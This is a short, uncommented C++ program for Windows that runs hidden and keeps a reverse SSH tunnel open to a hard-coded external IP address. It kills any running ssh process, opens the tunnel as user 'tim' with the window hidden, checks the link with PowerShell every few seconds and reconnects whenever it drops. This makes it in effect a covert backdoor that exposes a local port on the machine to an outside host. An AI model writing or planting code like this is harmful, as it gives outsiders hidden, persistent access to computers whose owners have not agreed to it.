#include <fstream>
#include <sstream>
#include <string>
#include <windows.h>
int main()
{
    while (true)
    {
        WinExec("taskkill -im ssh.exe -f", SW_HIDE);
        Sleep(1000);
        WinExec("ssh -R 4489:localhost:4489 tim@111.253.112.15 -p 1722", SW_HIDE);
        while (true)
        {
            WinExec("PowerShell Test-NetConnection -ComputerName 111.253.112.15 -Port 4489 >result.txt", SW_HIDE);
            Sleep(15000);
            std::ifstream fin;
            fin.open("result.txt");
            std::stringstream ss;
            ss << fin.rdbuf();
            fin.close();
            if (ss.str().size() < 400)
                Sleep(30000);
            else
                break;
        }
    }
}